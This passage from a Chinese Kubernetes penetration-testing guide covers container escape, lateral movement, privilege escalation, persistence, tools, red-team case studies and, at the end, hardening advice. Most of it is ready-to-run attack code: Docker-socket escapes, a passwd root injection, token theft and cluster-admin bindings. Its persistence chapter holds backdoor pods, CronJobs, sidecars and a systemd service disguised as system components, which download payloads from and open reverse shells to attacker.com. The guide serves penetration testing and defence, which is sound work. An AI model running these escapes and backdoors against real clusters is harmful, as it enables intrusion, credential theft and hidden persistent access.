- `/var/run/docker.sock`：Docker套接字
- `/proc`：宿主机proc文件系统
- `/sys`：宿主机sys文件系统
- `/etc`：宿主机配置目录
- `/var/lib/kubelet`：kubelet目录

#### 5.2.2 利用Docker Socket逃逸

如果容器挂载了`/var/run/docker.sock`，可以直接通过Docker API控制宿主机上的所有容器。

```bash
# 检查Docker Socket是否可用
ls -la /var/run/docker.sock

# 查看宿主机上的容器
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# 创建新的特权容器并挂载宿主机根目录
curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["chroot", "/host", "/bin/bash"],
    "Binds": ["/:/host"],
    "Privileged": true
  }'

# 启动容器
curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/<container-id>/start"

# 或者直接在宿主机上执行命令
curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "echo \"attacker::0:0:root:/root:/bin/bash\" >> /host/etc/passwd"],
    "Binds": ["/etc:/host/etc"]
  }'
```

#### 5.2.3 利用kubelet挂载逃逸

如果挂载了`/var/lib/kubelet`或`/etc/kubernetes`目录，可以获取节点上的kubelet配置和凭证。

```bash
# 读取kubelet配置
cat /host/var/lib/kubelet/config.yaml
cat /host/etc/kubernetes/kubelet.conf

# 获取kubelet证书
cat /host/var/lib/kubelet/pki/kubelet-client-current.pem

# 获取Pod manifest（静态Pod）
ls /host/etc/kubernetes/manifests/

# 读取所有Pod的ServiceAccount Token
find /host/var/lib/kubelet/pods -name token -exec cat {} \;
```

### 5.3 内核漏洞利用逃逸

#### 5.3.1 常见内核漏洞

容器本质上是共享宿主机内核的进程，因此内核漏洞可以直接导致容器逃逸。

| CVE编号 | 漏洞描述 | 影响版本 | 利用难度 |
|---------|---------|---------|---------|
| CVE-2024-21626 | runc文件描述符泄漏 | runc < 1.1.12 | 中 |
| CVE-2022-0185 | fsconfig堆溢出 | Linux 5.1-5.16.2 | 中高 |
| CVE-2021-22555 | netfilter越界写 | Linux 2.6-5.12 | 中 |
| CVE-2020-14386 | AF_PACKET内存损坏 | Linux 4.6-5.9 | 中 |
| CVE-2019-5736 | runc容器逃逸 | runc < 1.0-rc7 | 高（简单） |

#### 5.3.2 CVE-2024-21626 漏洞利用

这是runc的一个文件描述符泄漏漏洞，攻击者可以通过在容器内打开`/proc/self/fd/7`来访问宿主机文件系统。

```bash
# 利用条件：runc版本 < 1.1.12
# 检查runc版本
runc --version

# 利用方法：
# 1. 在容器启动时，工作目录设置为/proc/self/fd/7
# 2. 容器启动后，当前目录即为宿主机根文件系统

# 在K8s中利用：
# 修改Pod的workingDir为/proc/self/fd/7
apiVersion: v1
kind: Pod
metadata:
  name: cve-2024-21626
spec:
  containers:
  - name: test
    image: alpine
    workingDir: /proc/self/fd/7  # 触发漏洞
    command: ["sleep", "infinity"]
```

#### 5.3.3 dirty pipe（CVE-2022-0847）利用

Dirty Pipe是Linux内核的一个漏洞，允许非特权用户写入任意只读文件。在容器中利用此漏洞可以修改宿主机的文件。

```bash
# 影响版本：Linux 5.8 - 5.16.11/5.15.25/5.10.102
# 检查内核版本
uname -r

# 利用思路：
# 1. 创建管道并填充数据
# 2. splice将目标文件页放入管道
# 3. 向管道写入新数据，修改文件页
# 4. 修改的页面会写回到文件缓存

# 典型利用目标：
# - 修改/etc/passwd添加root用户
# - 修改/etc/shadow设置密码
# - 注入SSH公钥
# - 修改容器运行时二进制
```

### 5.4 cgroup/namespace绕过

#### 5.4.1 Namespace隔离机制

Linux Namespace是容器隔离的基础，共有7种Namespace：

| Namespace | 系统调用参数 | 隔离内容 |
|-----------|-------------|---------|
| UTS | CLONE_NEWUTS | 主机名和域名 |
| IPC | CLONE_NEWIPC | 信号量、消息队列、共享内存 |
| PID | CLONE_NEWPID | 进程编号 |
| Network | CLONE_NEWNET | 网络设备、栈、端口 |
| Mount | CLONE_NEWNS | 文件系统挂载点 |
| User | CLONE_NEWUSER | 用户和用户组 |
| Cgroup | CLONE_NEWCGROUP | cgroup根目录 |

#### 5.4.2 Namespace逃逸思路

**User Namespace逃逸：**
User Namespace允许容器内的root用户映射到宿主机的普通用户。如果映射配置错误，可能导致容器内root拥有宿主机root权限。

```bash
# 检查User Namespace映射
cat /proc/self/uid_map
# 如果宿主机root(0)也被映射到容器root，就存在风险
```

**Mount Namespace逃逸：**
通过某些系统调用可以绕过Mount Namespace限制，访问宿主机文件系统。

```bash
# 利用pivot_root
# 利用mount --move
# 利用symlink + procfs
```

#### 5.4.3 cgroup逃逸

cgroup用于限制容器的资源使用。某些cgroup特性可被利用实现逃逸。

**cgroup v1 release_agent逃逸（已在特权容器章节介绍）**

**cgroup v2逃逸：**
cgroup v2中release_agent已被移除，但仍有其他攻击面：
- 通过cgroup的device controller绕过设备限制
- 利用cgroup的io controller进行IO侧信道攻击
- cgroup v1和v2混合模式下的绕过

---

## 第6章 横向移动与权限提升

### 6.1 Pod到Pod横向移动

#### 6.1.1 网络层面横向移动

默认情况下，K8s集群内Pod之间网络是全通的，没有网络隔离。攻击者可以在一个Pod内扫描和访问其他Pod。

**Pod内网络探测：**
```bash
# 获取Pod的IP和网段
ip addr
ip route

# 扫描同一网段内的其他Pod
for i in $(seq 1 254); do
  timeout 1 bash -c "echo >/dev/tcp/10.244.0.$i/80" 2>/dev/null && echo "10.244.0.$i:80 open" &
done
wait

# 探测Service网络
# 通常Service网段是10.96.0.0/12
for i in $(seq 1 100); do
  timeout 1 bash -c "echo >/dev/tcp/10.96.0.$i/443" 2>/dev/null && echo "10.96.0.$i:443 open" &
done
wait
```

#### 6.1.2 利用应用漏洞横向移动

**常见横向移动向量：**
- 其他Pod中的Web应用漏洞（RCE、SQL注入）
- 未授权访问的服务（Redis、MongoDB、Elasticsearch）
- 服务间调用的API接口漏洞
- 消息队列中的消息窃取和篡改

**利用Redis未授权访问：**
```bash
# 连接Redis
redis-cli -h <redis-pod-ip>

# 查看数据
keys *
get <key>

# 如果Redis以root运行且挂载了磁盘
# 可以写入SSH公钥或crontab计划任务
```

### 6.2 Service Account权限提升

#### 6.2.1 权限枚举

获取到ServiceAccount Token后，首先要枚举其权限：

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# 查看权限列表
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'

# 使用kubectl
kubectl --token=$TOKEN --certificate-authority=$CACERT --server=$APISERVER auth can-i --list
```

#### 6.2.2 高危权限利用

**权限1：pods/exec**
```bash
# 可以在其他Pod中执行命令
kubectl --token=$TOKEN exec -it <target-pod> -- /bin/bash

# 读取其他Pod的ServiceAccount Token
kubectl --token=$TOKEN exec <target-pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**权限2：pods create + privileged**
```bash
# 创建特权Pod，然后逃逸到节点
kubectl --token=$TOKEN apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: alpine
    securityContext:
      privileged: true
    command: ["sleep", "infinity"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF
```

**权限3：secrets get/list**
```bash
# 读取所有Secret，寻找高权限凭证
kubectl --token=$TOKEN get secrets --all-namespaces
kubectl --token=$TOKEN get secret <secret-name> -n <namespace> -o yaml
```

**权限4：clusterrolebindings create**
```bash
# 直接创建管理员绑定
kubectl --token=$TOKEN create clusterrolebinding pwned \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default
```

**权限5：impersonate**
```bash
# 模拟管理员用户
kubectl --token=$TOKEN --as=system:serviceaccount:kube-system:default \
  --as-group=system:masters get pods --all-namespaces
```

### 6.3 RBAC配置错误利用

#### 6.3.1 常见RBAC配置错误

1. **通配符权限**：使用`*`作为资源或动词
2. **权限过大的默认ServiceAccount**
3. **用户/服务账户被错误绑定到高权限角色**
4. **使用cluster-admin角色的情况过多**
5. **未使用命名空间隔离权限**

#### 6.3.2 危险角色检测

```bash
# 查找拥有全部权限的角色
kubectl get clusterroles -o json | jq '.items[] | select(.rules[].verbs[]=="*") | .metadata.name'

# 查找绑定了cluster-admin的主体
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]'

# 查找可以创建Pod的角色
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[].resources[]=="pods" and .rules[].verbs[]=="create") | .metadata.name'
```

### 6.4 节点权限获取

#### 6.4.1 从Pod到节点

获取节点权限是K8s渗透测试的重要里程碑，意味着从容器层突破到了宿主机层。

**获取节点权限的常见路径：**

1. **特权容器逃逸** → 直接获得节点root权限
2. **hostPath挂载逃逸** → 通过挂载宿主机目录获得访问权
3. **容器运行时漏洞** → 利用runc/containerd漏洞
4. **内核漏洞** → 利用内核漏洞提权逃逸
5. **kubelet API利用** → 通过kubelet API管理节点上的Pod

#### 6.4.2 节点权限后的操作

获得节点权限后，可以：

1. **访问节点上所有Pod的文件系统**
   ```bash
   # Pod文件系统通常在/var/lib/docker/或/var/lib/containerd/下
   ls /var/lib/kubelet/pods/
   # 每个Pod目录下有volumes和containers子目录
   ```

2. **获取kubelet凭证**
   ```bash
   cat /var/lib/kubelet/kubeconfig
   cat /var/lib/kubelet/pki/kubelet-client-current.pem
   ```

3. **访问etcd（如果是控制平面节点）**
   ```bash
   # 控制平面节点上通常有etcd证书
   ls /etc/kubernetes/pki/etcd/
   ```

4. **持久化访问**
   ```bash
   # 添加SSH公钥
   echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
   
   # 创建后门用户
   useradd -o -u 0 -g 0 backdoor
   
   # 安装rootkit
   ```

5. **横向移动到其他节点**
   - 利用节点上的凭证访问API Server
   - 通过共享存储访问其他节点数据
   - 利用K8s网络插件漏洞

---

## 第7章 持久化技术

### 7.1 后门Pod部署

#### 7.1.1 隐蔽Pod部署

创建不明显的后门Pod，保持长期访问。

**隐蔽技巧：**
- 使用与系统组件相似的名称（如`kube-flannel-backdoor`）
- 部署在`kube-system`等系统命名空间
- 使用常见的镜像名称和标签
- 设置合理的资源限制，避免引起注意
- 不暴露Service端口，使用反向连接

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: kube-proxy-backdoor
  namespace: kube-system
  labels:
    k8s-app: kube-proxy-backdoor
    tier: node
spec:
  containers:
  - name: backdoor
    image: k8s.gcr.io/pause:3.6  # 使用常见镜像
    command:
    - /bin/sh
    - -c
    - |
      # 下载后门程序并执行
      wget http://attacker.com/backdoor -O /tmp/backdoor
      chmod +x /tmp/backdoor
      /tmp/backdoor reverse-shell attacker.com 4444
    resources:
      requests:
        cpu: 10m
        memory: 16Mi
      limits:
        cpu: 100m
        memory: 64Mi
  restartPolicy: Always
  nodeSelector:
    kubernetes.io/os: linux
```

#### 7.1.2 静态Pod持久化

在控制平面节点上，kubelet会监视`/etc/kubernetes/manifests/`目录，目录中的Pod定义文件会被自动创建为静态Pod。

```bash
# 在控制平面节点上创建静态Pod
cat > /etc/kubernetes/manifests/etcd-backdoor.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: etcd-backdoor
  namespace: kube-system
spec:
  hostNetwork: true
  containers:
  - name: backdoor
    image: alpine:3.18
    command: ["sleep", "infinity"]
    volumeMounts:
    - name: etcd-certs
      mountPath: /etc/kubernetes/pki/etcd
  volumes:
  - name: etcd-certs
    hostPath:
      path: /etc/kubernetes/pki/etcd
EOF
```

### 7.2 CronJob持久化

#### 7.2.1 CronJob后门

利用K8s的CronJob资源实现定期执行的后门。

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-updater
  namespace: kube-system
spec:
  schedule: "*/30 * * * *"  # 每30分钟执行一次
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: cronjob-sa
          containers:
          - name: updater
            image: busybox
            command:
            - /bin/sh
            - -c
            - |
              # 反向shell
              sh -i >& /dev/tcp/attacker.com/4444 0>&1
          restartPolicy: OnFailure
```

#### 7.2.2 高权限CronJob

为CronJob分配高权限的ServiceAccount，定期执行命令维持访问。

```bash
# 创建高权限ServiceAccount
kubectl create sa system-maintenance -n kube-system
kubectl create clusterrolebinding system-maintenance \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:system-maintenance
```

### 7.3 控制器篡改

#### 7.3.1 修改现有Deployment

篡改已有的Deployment，注入后门容器（Sidecar注入）。

```bash
# 修改现有Deployment，添加后门容器
kubectl patch deployment <existing-deploy> -n <namespace> --type=json -p='
[
  {
    "op": "add",
    "path": "/spec/template/spec/containers/-",
    "value": {
      "name": "sidecar-logger",
      "image": "busybox:latest",
      "command": ["/bin/sh", "-c", "while true; do sh -i >& /dev/tcp/attacker.com/4444 0>&1; sleep 3600; done"]
    }
  }
]'
```

#### 7.3.2 DaemonSet持久化

DaemonSet会在每个节点上运行一个Pod副本，非常适合全节点持久化。

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-exporter-backdoor
  namespace: monitoring
  labels:
    app: node-exporter
spec:
  selector:
    matchLabels:
      app: node-exporter
  template:
    metadata:
      labels:
        app: node-exporter
    spec:
      hostPID: true
      hostNetwork: true
      containers:
      - name: node-exporter
        image: prom/node-exporter:v1.5.0
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
```

### 7.4 节点持久化

#### 7.4.1 SSH密钥持久化

```bash
# 追加SSH公钥到root用户
echo "ssh-rsa AAAAB3NzaC1yc2EAAA... attacker@evil.com" >> /root/.ssh/authorized_keys

# 检查sshd配置，确保允许root登录
cat /etc/ssh/sshd_config | grep PermitRootLogin
```

#### 7.4.2 系统服务后门

```bash
# 创建系统服务
cat > /etc/systemd/system/system-update.service <<EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/system-update.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

cat > /usr/local/bin/system-update.sh <<EOF
#!/bin/bash
# 反向shell
while true; do
  bash -i >& /dev/tcp/attacker.com/443 0>&1
  sleep 300
done
EOF

chmod +x /usr/local/bin/system-update.sh
systemctl enable system-update.service
systemctl start system-update.service
```

#### 7.4.3 控制平面持久化

如果获得了控制平面节点的权限，可以进行更深度的持久化：

1. **篡改API Server配置**：添加额外的认证方式
2. **篡改etcd数据**：创建隐藏的管理员账户
3. **Webhook注入**：添加恶意的Admission Webhook
4. **证书篡改**：植入后门证书

---

## 第8章 渗透测试工具链

### 8.1 kube-hunter

#### 8.1.1 工具介绍

kube-hunter是Aqua Security开发的Kubernetes渗透测试工具，用于发现K8s集群的安全弱点。

**核心特性：**
- 支持多种扫描模式（远程扫描、节点扫描、Pod内扫描）
- 覆盖50+种漏洞检测
- 提供详细的漏洞描述和修复建议
- 支持主动和被动扫描模式

#### 8.1.2 使用方法

```bash
# 安装
pip install kube-hunter

# 远程扫描指定节点
kube-hunter --remote <node-ip>

# 扫描多个节点
kube-hunter --remote 10.0.0.1,10.0.0.2,10.0.0.3

# 扫描CIDR范围
kube-hunter --cidr 10.0.0.0/24

# 主动扫描（更深入的测试）
kube-hunter --remote <node-ip> --active

# 在Pod内运行
kube-hunter --pod

# 输出JSON格式
kube-hunter --remote <node-ip> --json > results.json

# 以k8s Job方式运行
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-hunter/main/job.yaml
```

#### 8.1.3 检测项示例

kube-hunter检测的常见漏洞：
- 匿名认证可用
- K8s Dashboard未授权访问
- etcd可读写访问
- kubelet API未授权访问
- 容器内可访问云元数据服务
- 特权容器检测
- 敏感信息泄露

### 8.2 kube-bench

#### 8.2.1 工具介绍

kube-bench是Aqua Security开发的Kubernetes安全配置检查工具，基于CIS Kubernetes Benchmark标准。

**核心特性：**
- 覆盖CIS Benchmark的所有检查项
- 支持多种K8s发行版（EKS、GKE、AKS、OpenShift等）
- 详细的检查结果和修复建议
- 支持JSON/YAML输出格式

#### 8.2.2 使用方法

```bash
# 在节点上直接运行
docker run --rm -it \
  --pid=host \
  -v /etc:/etc:ro \
  -v /var:/var:ro \
  -v /usr/bin:/usr/local/mount-from-host/bin:ro \
  aquasec/kube-bench:latest run

# 作为Job运行在K8s集群中
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs kube-bench-xxxxx

# 运行特定检查集
kube-bench run --targets=master
kube-bench run --targets=node
kube-bench run --targets=etcd
kube-bench run --targets=policies

# 输出JSON
kube-bench run --json
```

### 8.3 kubescape

#### 8.3.1 工具介绍

Kubescape是ARMO开发的K8s安全测试框架，支持多框架的合规性检查和风险评估。

**核心特性：**
- 支持NSA、CIS、MITRE ATT&CK等多个框架
- 风险评分和可视化
- CI/CD集成
- 支持扫描YAML文件和运行中的集群

#### 8.3.2 使用方法

```bash
# 安装
curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash

# 扫描当前集群
kubescape scan

# 使用特定框架扫描
kubescape scan framework nsa
kubescape scan framework cis
kubescape scan framework mitre

# 扫描YAML文件
kubescape scan deployment.yaml
kubescape scan k8s-manifests/

# 扫描指定命名空间
kubescape scan --include-namespaces production,staging

# 输出报告
kubescape scan --format pdf --output report.pdf
kubescape scan --format json --output results.json
```

### 8.4 trivy

#### 8.4.1 工具介绍

Trivy是Aqua Security开发的综合性安全扫描工具，支持容器镜像、文件系统、Git仓库、K8s集群等多种扫描目标。

**核心特性：**
- 容器镜像漏洞扫描
- IaC配置错误检测
- 敏感信息扫描
- SBOM生成
- K8s集群扫描

#### 8.4.2 使用方法

```bash
# 安装
brew install aquasecurity/trivy/trivy

# 扫描容器镜像
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL alpine:3.18

# 扫描K8s配置文件
trivy config deployment.yaml
trivy config ./k8s-manifests/

# 扫描运行中的K8s集群
trivy k8s --report=summary cluster
trivy k8s --report=all --format json cluster

# 扫描命名空间
trivy k8s --namespace kube-system all

# 扫描文件系统中的敏感信息
trivy fs --scanners secret ./
```

### 8.5 Metasploit K8s模块

#### 8.5.1 Metasploit中的K8s模块

Metasploit Framework中包含多个Kubernetes相关的辅助和渗透模块。

**常用模块：**
```
auxiliary/cloud/kubernetes/enum_kubernetes
auxiliary/cloud/kubernetes/kubectl_exec
exploit/multi/http/kubernetes_kubelet_exec
auxiliary/gather/kubernetes_secrets
post/linux/gather/kubernetes_config
```

#### 8.5.2 使用示例

```bash
# 启动msfconsole
msfconsole

# 使用kubelet exec模块
use exploit/multi/http/kubernetes_kubelet_exec
set RHOSTS <node-ip>
set RPORT 10250
set TARGETURI /run/default/podname/container
set CMD id
run

# 枚举K8s信息
use auxiliary/cloud/kubernetes/enum_kubernetes
set RHOSTS <api-server-ip>
set RPORT 6443
set TOKEN <service-account-token>
run

# 获取K8s Secrets
use auxiliary/gather/kubernetes_secrets
set RHOSTS <api-server-ip>
set TOKEN <service-account-token>
run
```

### 8.6 其他工具

| 工具名称 | 类型 | 用途 |
|---------|------|------|
| kubeaudit | 开源 | K8s安全审计工具 |
| kube-scan | 开源 | K8s风险评分工具 |
| Popeye | 开源 | K8s集群清理和检查 |
| Pluto | 开源 | 检测废弃的K8s API版本 |
| Snyk Controller | 商业 | K8s工作负载安全扫描 |
| Falco | 开源 | 运行时威胁检测 |
| kube-hunter | 开源 | 渗透测试工具（已介绍） |
| amicontained | 开源 | 容器环境检测工具 |

---

## 第9章 实战案例

### 9.1 案例1：从Dashboard未授权到集群控制

#### 9.1.1 场景描述

红队测试目标：某企业内部K8s测试集群
已知信息：集群部署在公司内网，IP段为10.0.0.0/24
测试目标：获取集群的完全控制权限

#### 9.1.2 渗透过程

**Step 1：端口扫描发现目标**
```bash
nmap -sS -p 1-10000 10.0.0.0/24 --open
```
发现结果：
- 10.0.0.10:6443 - K8s API Server
- 10.0.0.10:30000 - NodePort服务
- 10.0.0.11:10250 - kubelet

**Step 2：探测Dashboard**
```bash
# 访问30000端口
curl -k https://10.0.0.10:30000/
# 返回Kubernetes Dashboard登录页面

# 尝试跳过认证
curl -k https://10.0.0.10:30000/#!/overview
# 发现可以直接访问，无需认证！
```

**Step 3：确认Dashboard权限**
通过Dashboard界面可以查看：
- 所有命名空间的Pod
- 所有Service和Deployment
- 所有Secret
- 节点信息

说明Dashboard使用的ServiceAccount拥有集群管理员权限。

**Step 4：获取管理员Token**
在Dashboard中找到kube-system命名空间下的Secret：
```
kubernetes-dashboard-token-xxxxx
```
解码Token后，获得完整的ServiceAccount Token。

**Step 5：使用Token控制集群**
```bash
# 配置kubectl
kubectl config set-cluster target-cluster \
  --server=https://10.0.0.10:6443 \
  --insecure-skip-tls-verify=true

kubectl config set-credentials dashboard-admin --token=<token>

kubectl config set-context target-cluster \
  --cluster=target-cluster \
  --user=dashboard-admin

kubectl config use-context target-cluster

# 验证权限
kubectl get nodes
kubectl get pods --all-namespaces
kubectl auth can-i "*" "*"
# 输出: yes - 确认拥有集群管理员权限
```

**Step 6：部署后门持久化**
```bash
# 创建高权限ServiceAccount
kubectl create sa svc-monitor -n kube-system
kubectl create clusterrolebinding svc-monitor-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:svc-monitor

# 获取Token
kubectl get secret -n kube-system | grep svc-monitor
kubectl get secret svc-monitor-token-xxxxx -n kube-system \
  -o jsonpath='{.data.token}' | base64 -d
```

#### 9.1.3 根因分析

1. Dashboard通过NodePort暴露在网络中
2. Dashboard启用了跳过登录功能（`--enable-skip-login`）
3. Dashboard绑定了`cluster-admin`角色
4. 没有配置网络策略限制Dashboard访问

### 9.2 案例2：从容器逃逸到节点接管

#### 9.2.1 场景描述

攻击者通过Web应用漏洞获得了一个Pod的shell访问权限，需要进一步提升权限。
初始权限：普通用户Pod中的shell，ServiceAccount权限有限

#### 9.2.2 渗透过程

**Step 1：Pod内信息收集**
```bash
# 基本信息
id
cat /etc/os-release
uname -r

# 检查特权模式
cat /proc/self/status | grep CapEff
# CapEff: 00000000a80425fb - 非特权容器

# 检查挂载
mount | grep host
# 发现 /var/run/docker.sock 挂载！

# 检查环境变量
env | grep -i pass
env | grep -i secret
```

**Step 2：利用Docker Socket**
```bash
# 确认Docker Socket可用
curl --unix-socket /var/run/docker.sock http://localhost/version

# 查看运行中的容器
curl --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# 查看宿主机信息
curl --unix-socket /var/run/docker.sock http://localhost/info | python3 -m json.tool

# 创建特权容器
curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/create?name=escape" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["sleep", "infinity"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }'

# 启动容器
curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/escape/start"

# 进入容器执行命令
docker exec escape chroot /host /bin/bash
# 现在已经在宿主机上了！
```

**Step 3：节点权限获取**
```bash
# 已经在宿主机上，获取更多凭证
cat /var/lib/kubelet/kubeconfig
cat /var/lib/kubelet/pki/kubelet-client-current.pem

# 查看节点上所有Pod的Token
find /var/lib/kubelet/pods -name token 2>/dev/null | head -10

# 读取一个高权限Pod的Token
cat /var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~serviceaccount-token/token

# 检查是否是控制平面节点
ls /etc/kubernetes/manifests/
# 如果有kube-apiserver.yaml等文件，说明是控制节点

# 控制节点上获取etcd证书
ls /etc/kubernetes/pki/etcd/
```

**Step 4：集群管理员权限获取**
```bash
# 使用etcd证书直接读取集群数据
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/kube-system --prefix

# 获取cluster-admin的token
# 或者直接在etcd中创建新的管理员
```

#### 9.2.3 经验总结

1. Docker Socket挂载是高危配置，应严格禁止
2. 即使是普通应用Pod，也可能通过挂载逃逸
3. Pod安全策略（PSA）应启用Restricted级别
4. 节点访问控制和审计至关重要

### 9.3 案例3：K8s红蓝对抗演练

#### 9.3.1 演练背景

某金融企业组织K8s红蓝对抗演练：
- **蓝队**：负责防御，使用Falco、kube-bench、SIEM等工具
- **红队**：模拟攻击者，从外部IP发起攻击
- **目标**：红队需要获取生产环境核心数据库的数据
- **时间**：48小时

#### 9.3.2 红队攻击路径

**阶段1：外部侦察（0-4小时）**
- 子域名枚举发现`api.prod.example.com`
- 端口扫描发现443端口运行K8s API Server
- 确认API版本为v1.27.3
- 发现Ingress暴露的多个应用

**阶段2：初始访问（4-12小时）**
- 在一个测试应用中发现SQL注入漏洞
- 通过SQL注入获取到数据库中的应用凭证
- 利用凭证登录管理后台，发现文件上传功能
- 上传Webshell获得Pod内访问权限

**阶段3：权限枚举与提升（12-20小时）**
- 读取ServiceAccount Token，发现权限有限（只能读当前命名空间的资源）
- 在Pod环境变量中发现对象存储的Access Key
- 利用Access Key访问S3存储桶
- 在存储桶中发现备份的kubeconfig文件
- 使用kubeconfig获得集群只读权限

**阶段4：横向移动（20-30小时）**
- 枚举集群中的Pod和服务
- 发现Jenkins Pod，尝试攻击
- 通过Jenkins的API漏洞获取凭证
- 获得Jenkins的ServiceAccount Token（较高权限）
- 发现该ServiceAccount可以创建Pod

**阶段5：容器逃逸（30-38小时）**
- 利用Jenkins的ServiceAccount创建特权Pod
- 成功逃逸到宿主机节点
- 在节点上获取更多凭证
- 横向移动到控制平面节点

**阶段6：目标达成（38-42小时）**
- 获得集群管理员权限
- 定位到生产数据库Pod
- 通过exec进入数据库Pod
- 导出核心业务数据

#### 9.3.3 蓝队检测与响应

**检测到的攻击行为：**
1. 异常的SQL注入流量（WAF告警）
2. 异常的文件上传（DLP告警）
3. Pod内异常网络连接（Falco告警）
4. 异常的API调用模式（审计日志分析）
5. 新创建的特权Pod（PSA告警）

**响应措施：**
- 隔离受感染的Pod
- 轮换泄露的凭证
- 修复应用漏洞
- 加强RBAC权限控制

#### 9.3.4 演练结果

- 红队成功获取目标数据（42小时）
- 蓝队在第18小时检测到入侵
- 发现12个安全漏洞和配置问题
- 输出完整的加固建议报告

---

## 第10章 防御与加固建议

### 10.1 控制平面加固

**API Server安全：**
- 禁用匿名认证：`--anonymous-auth=false`
- 启用TLS双向认证
- 配置合理的RBAC策略
- 启用审计日志
- 限制API Server的网络访问
- 定期轮换证书

**etcd安全：**
- 启用TLS认证和加密
- 配置防火墙限制etcd端口访问
- 启用etcd客户端证书认证
- 定期备份etcd数据并加密
- 监控etcd的访问日志

**控制平面组件：**
- 禁用控制器管理器的不安全端口
- 禁用调度器的不安全端口
- 确保所有组件间通信使用TLS
- 控制平面节点最小化安装软件

### 10.2 节点与工作负载加固

**kubelet安全：**
- 禁用匿名认证：`--anonymous-auth=false`
- 禁用只读端口：`--read-only-port=0`
- 启用Webhook授权模式
- 配置证书轮换
- 限制kubelet端口的网络访问

**Pod安全标准（PSA）：**
- Privileged：完全无限制（不推荐）
- Baseline：基本安全限制（最小特权）
- Restricted：严格限制（最佳实践）

**Restricted策略限制项：**
- 禁止特权模式
- 禁止以root用户运行
- 禁止hostPath挂载
- 禁止hostNetwork和hostPID
- 限制Linux Capabilities
- 强制只读根文件系统
- 强制Seccomp Profile

**容器镜像安全：**
- 使用可信的基础镜像
- 定期扫描镜像漏洞
- 最小化镜像（使用distroless镜像）
- 启用镜像签名验证
- 使用私有镜像仓库并配置认证

### 10.3 网络安全加固

**网络策略（NetworkPolicy）：**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-app-db
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 5432
```

**服务网格（Service Mesh）：**
- 启用mTLS加密东西向流量
- 实现细粒度的服务访问控制
- 流量可视化和审计
- 推荐方案：Istio、Linkerd

### 10.4 身份与访问管理

**RBAC最佳实践：**
- 遵循最小权限原则
- 使用命名空间隔离不同团队/环境
- 优先使用Role而非ClusterRole
- 定期审计RBAC配置
- 避免使用通配符权限
- 禁用默认ServiceAccount的自动挂载

**ServiceAccount安全：**
```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: myapp-sa
  namespace: production
automountServiceAccountToken: false  # 禁用自动挂载
```

**多因素认证：**
- 管理员账户强制MFA
- 使用OIDC集成企业身份提供商
- 定期审计用户访问权限

### 10.5 监控与审计

**审计日志：**
- 启用API Server审计日志
- 审计日志集中存储和分析
- 配置告警规则检测异常行为
- 审计日志保留期限符合合规要求

**运行时安全监控：**
- 部署Falco等运行时检测工具
- 监控异常进程、文件访问、网络连接
- 容器行为基线学习
- 实时告警和响应

**安全事件响应：**
- 建立K8s安全事件响应流程
- 定期进行应急响应演练
- 维护事件响应手册
- 与SIEM系统集成

---

## 第11章 学习资源与工具清单

